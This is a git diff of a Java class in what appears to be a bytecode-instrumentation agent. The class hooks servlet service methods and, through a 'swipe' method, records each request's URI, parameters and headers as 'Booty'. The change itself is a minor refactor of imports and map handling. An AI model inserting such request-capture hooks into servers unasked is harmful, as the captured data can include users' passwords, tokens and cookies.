@@ -10,7 +10,10 @@ import vom.client.chase.Booty;
 
 import javax.servlet.http.HttpServletRequest;
 import java.util.Enumeration;
-import java.util.HashMap;
+import java.util.Map;
+
+import static java.util.Collections.unmodifiableMap;
+import static vom.client.asm.VOMClientTransformer.ASM_VERSION;
 
 @Slf4j
 public class HttpServletServiceMethodVisitor extends LocalVariablesSorter {
@@ -19,7 +22,7 @@ public class HttpServletServiceMethodVisitor extends LocalVariablesSorter {
       Type.getInternalName(HttpServletServiceMethodVisitor.class);
   
   public HttpServletServiceMethodVisitor(MethodVisitor visitor, int access, String descriptor) {
-    super(Config.ASM_VERSION, access, descriptor, visitor);
+    super(ASM_VERSION, access, descriptor, visitor);
   }
   
   @Override
@@ -50,11 +53,13 @@ public class HttpServletServiceMethodVisitor extends LocalVariablesSorter {
   }
   
   public static void swipe(HttpServletRequest request) {
+    final Map<?, ?> parameters = unmodifiableMap(request.getParameterMap());
+    
     final Booty booty = Booty.builder()
         .id(Config.getId())
         .collected(System.currentTimeMillis())
         .uri(request.getRequestURI())
-        .parameters(new HashMap<String, String>(request.getParameterMap()))
+        .parameters(parameters)
         .build();
     
     @SuppressWarnings("unchecked") final Enumeration<String> headerNames =
